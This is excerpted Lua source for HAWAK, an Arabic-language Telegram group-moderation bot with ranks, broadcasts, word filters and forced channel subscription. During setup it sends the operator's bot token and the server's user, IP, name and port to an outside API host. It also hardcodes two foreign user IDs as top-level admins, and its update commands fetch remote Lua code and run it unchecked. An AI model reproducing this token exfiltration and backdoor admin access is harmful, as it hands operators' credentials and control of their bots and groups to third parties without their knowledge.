...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua HAWAK.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
local SUDOID = io.read():gsub(' ','') 
if tostring(SUDOID):match('%d+') then
data,res = https.request("https://api-dragon.tk/api-s00f4/Dragon.php?bn=HAWAK&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-dragon.tk/api-s00f4/Dragon.php?bn=HAWAK&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua HAWAK.lua')
end 
end
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./HAWAK.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("HWK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S HAWAK -X kill
screen -S HAWAK ./HAWAK
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/HAWAKTEAM/Files_HAWAK/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1054308380,1842536919}   
...
function DevLeO(msg) 
local hash = database:sismember(bot_id.."Dev:LeO:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevLeO(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevLeO(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevLeO(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevLeO(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevLeO(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevLeO(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevLeO(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1842536919) then  
var = true  
...
var = true  
elseif database:sismember(bot_id.."Dev:LeO:2", user_id) then
var = true  
...
local UserName = (data.username_ or "SrcDrg")
...
local HAWAK_Msg = ''  
if msgs < 100 then 
HAWAK_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
HAWAK_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
HAWAK_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
HAWAK_Msg = 'متفاعل' 
elseif msgs < 1200 then 
HAWAK_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
HAWAK_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
HAWAK_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
HAWAK_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
HAWAK_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
HAWAK_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
HAWAK_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
HAWAK_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
HAWAK_Msg = 'رب التفاعل'  
end 
return HAWAK_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙰𝚆𝙰𝙺.")  
...
--------------------------------------------------------------------------------------------------------------
function SourceHAWAK(msg,data) -- بداية العمل
if msg then
...
if DevLeO(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,HAWAK_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ℘' and DevLeO(msg) then  
...
if text == 'تعطيل التواصل ℘' and DevLeO(msg) then  
...
if text == 'تفعيل البوت الخدمي ℘' and DevLeO(msg) then  
...
if text == 'تعطيل البوت الخدمي ℘' and DevLeO(msg) then  
...
if text == 'ضع كليشه ستارت ℘' and DevLeO(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ℘︙ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ℘' and DevLeO(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ℘' and DevLeO(msg) then 
...
if text == 'تحديث السورس ℘' and DevLeO(msg) then 
os.execute('rm -rf HAWAK.lua')
os.execute('wget https://raw.githubusercontent.com/HAWAKTEAM/HAWAK/main/HAWAK.lua')
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس هــواك\n ℘︙ الاصدار » { v 1.6 }')
dofile('HAWAK.lua')  
end
if text == 'الاصدار ℘' and DevLeO(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس هــواك \n ℘︙ الاصدار »{ v 1.6 }')
end
if text == "ضع اسم للبوت ℘" and DevLeO(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ℘' and DevLeO(msg) then 
...
if text == 'المشتركين ℘' and DevLeO(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ℘︙ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ℘' and DevLeO(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ℘︙ الكروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ℘") and DevLeO(msg) then
...
if text == ("الثانويين ℘") and DevLeO(msg) then
local list = database:smembers(bot_id..'Dev:LeO:2')
t = "\n ℘︙ قائمة الثانويين \nٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
-------------
if text == "☂ حصريات و تحديثات هواك ☂" and DevLeO(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس هــواك*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝙷𝙰𝚆𝙰𝙺 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/lllEll2"}},
}
...
-----------
if text == ("قائمه العام ℘") and DevLeO(msg) then
...
if text == ("قائمه الكتم العام ℘") and DevLeO(msg) then
...
if text=="اذاعه خاص ℘" and msg.reply_to_message_id_ == 0 and DevLeO(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل الان اذاعتك؟ \n ℘︙ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ℘" and msg.reply_to_message_id_ == 0 and DevLeO(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل الان اذاعتك؟ \n ℘︙ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ℘" and msg.reply_to_message_id_ == 0 and DevLeO(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل الان اذاعتك؟ \n ℘︙ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ℘" and msg.reply_to_message_id_ == 0  and DevLeO(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ℘" and msg.reply_to_message_id_ == 0  and DevLeO(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ℘' and DevLeO(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ℘" and DevLeO(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الكروبات ℘" and DevLeO(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'℘︙  عدد الكروبات الان » { '..#group..' }'..HAWAKk..''..HAWAK..'\n℘︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevLeO(msg) then
...
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'SrcDrg')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevLeO(msg) then
...
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevLeO(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevLeO(msg) then
...
local HAWAK1_Msg = database:get(bot_id.."HAWAK1:Add:Filter:Rp2"..text..msg.chat_id_)   
if HAWAK1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SrcDrg')..') \n ℘︙ '..HAWAK1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if HAWAK_Msg and not Special(msg) then  
local HAWAK_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if HAWAK_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevLeO(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevLeO(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevLeO(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ℘︙ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevLeO(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ℘︙ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ℘" and DevLeO(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ℘︙ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ℘$") and DevLeO(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ℘︙ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ℘" and DevLeO(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ℘" and DevLeO(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ℘︙ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ℘" and DevLeO(msg) then  
...
database:sadd(bot_id.."HAWAK:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."HAWAK:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."HAWAK:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."HAWAK:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."HAWAK:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."HAWAK:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."HAWAK:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."HAWAK:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."HAWAK:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."HAWAK:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."HAWAK:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."HAWAK:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."HAWAK:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "SrcDrg")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."HAWAK:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local HAWAKChengName = database:get(bot_id.."HAWAK:Cheng:Name"..data.id_)
if not data.first_name_ then 
if HAWAKChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..HAWAKChengName..']')
database:del(bot_id.."HAWAK:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if HAWAKChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."HAWAK:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local HAWAKChengUserName = database:get(bot_id.."HAWAK:Cheng:UserName"..data.id_)
if not data.username_ then 
if HAWAKChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..HAWAKChengUserName..']')
database:del(bot_id.."HAWAK:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if HAWAKChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."HAWAK:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local HAWAKChengPhoto = database:get(bot_id.."HAWAK:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if HAWAKChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."HAWAK:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if HAWAKChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."HAWAK:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
℘ ⦑ SOURCE HAWAK ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/lllEll2)
℘︙ [Source Update ](t.me/lllEll2)     
℘︙ [Source developer](t.me/lllEll1)     
℘︙ [HAWAK programmer](t.me/lllEll3) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS HAWAK](t.me/SEHAWAKBOT)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if text == 'رفع نسخه الاحتياطيه' and DevLeO(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SrcDrg')..') \n ℘︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SrcDrg')..') \n ℘︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevLeO(msg) then    
dofile('HAWAK.lua')  
send(msg.chat_id_, msg.id_, ' ℘︙ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevLeO(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevLeO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevLeO(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevLeO(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevLeO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevLeO(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevLeO(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevLeO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevLeO(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevLeO(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevLeO(msg) then
...
if text == 'الملفات' and DevLeO(msg) then
t = ' ℘︙ ملفات السورس هــواك ↓\n ٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevLeO(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/HAWAKTEAM/Files_HAWAK/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات هــواك\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevLeO(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/HAWAKTEAM/Files_HAWAK/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('HAWAK.lua')  
else
send(msg.chat_id_, msg.id_," ℘︙ عذرا الملف لايدعم سورس هــواك \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevLeO(msg) then
...
if text == "مسح الملفات" and DevLeO(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ℘︙ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevLeO(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevLeO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "SRC-HAWAK")
...
database:sadd(bot_id.."Dev:LeO:2", result.sender_user_id_)
...
database:sadd(bot_id.."Dev:LeO:2", result.id_)
...
database:sadd(bot_id.."Dev:LeO:2", userid)
...
function Function_HAWAK(extra, result, success)
database:srem(bot_id.."Dev:LeO:2", result.sender_user_id_)
...
function Function_HAWAK(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:LeO:2", result.id_)
...
database:srem(bot_id.."Dev:LeO:2", userid)
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'
status  = '\n ℘︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ℘︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'
...
database:set(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ℘︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."HAWAK1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."HAWAK1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ℘︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."HAWAK1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."HAWAK1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."HAWAK1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ℘︙ ارسل الكلمه الان")  
database:set(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."HAWAK1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."HAWAK1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."HAWAK1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."HAWAK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."HAWAK1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."HAWAK1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ℘︙ قائمة المنع \nٴ≪┉ ┉ ┉ ┉ ┉ 𝐇𝐖𝐊 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do  
local HAWAK_Msg = database:get(bot_id.."HAWAK1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..HAWAK_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevLeO(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ℘︙ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevLeO(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ℘︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..'\n ℘︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevLeO(msg) then  
...
if text == 'تعطيل الاذاعه' and DevLeO(msg) then  
...
send(msg.chat_id_, msg.id_,'['..HAWAK_Msg[math.random(#HAWAK_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevLeO(msg) then 
...
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:LeO:2',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevLeO(msg) then 
...
if text == ("ردود المطور") and DevLeO(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n℘︙قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
...
if text == "اضف رد للكل" and DevLeO(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "حذف رد للكل" and DevLeO(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ℘︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:HAWAK:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:HAWAK:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:HAWAK:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:HAWAK:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:HAWAK:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:HAWAK:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:HAWAK:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:HAWAK:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:HAWAK:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:HAWAK:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:HAWAK:Add:Rd:Sudo:Text2"..v)   
